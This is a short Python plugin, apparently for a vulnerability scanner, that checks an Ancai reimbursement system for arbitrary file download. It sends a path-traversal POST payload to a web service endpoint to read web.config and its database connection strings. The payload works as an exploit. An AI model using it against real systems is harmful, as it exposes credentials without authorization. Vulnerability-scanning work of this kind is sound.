#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name: 安财软件通用报销系统任意文件下载2
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0121651
#Author:xq17
def assign(service, arg):
    if service == "acsoft":
        return True, arg

def audit(arg):
    payload = arg + "WS/WebServiceBase.asmx/GetXMLList"
    data = "strXMLFileName=/../web.config "
    code, head, res, errcode, _ = curl.curl2(payload,post=data)
    if code ==200 and 'connectionStrings' in res and 'GlobalConnectionString' in res:
         security_hole(payload+':Any reading' )
         

         return arg
if __name__== '__main__':
    from dummy import *
